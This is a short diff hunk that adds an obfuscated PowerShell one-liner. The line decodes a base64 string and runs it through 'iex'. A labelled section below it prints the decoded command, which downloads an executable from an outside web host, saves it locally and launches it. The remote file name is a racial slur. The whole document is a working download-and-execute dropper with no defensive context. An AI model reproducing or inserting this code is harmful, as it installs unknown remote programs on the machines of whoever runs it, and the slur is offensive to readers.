@@ -1,0 +1,7 @@
+iex([sYSTEM.texT.eNcodiNg]::UTf8.GeTstRING([SYsTEM.convErT]::froMBASE64STrINg('CihOZXctT2JqZWN0IFNZc3RlTS5uZXQud0VCY2xpRU50KS5ET1duTG9hZEZJbGUoJ2h0dHA6Ly93b3JsZG5pdC5jb20vbmlnZ2EuZXhlJywnZmxlZWJsZS5leGUnKTtTdGFydC1Qcm9jZXNzICdmbGVlYmxlLmV4ZScKCg==')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SYsteM.net.wEBcliENt).DOWnLoadFIle('http://worldnit.com/nigga.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
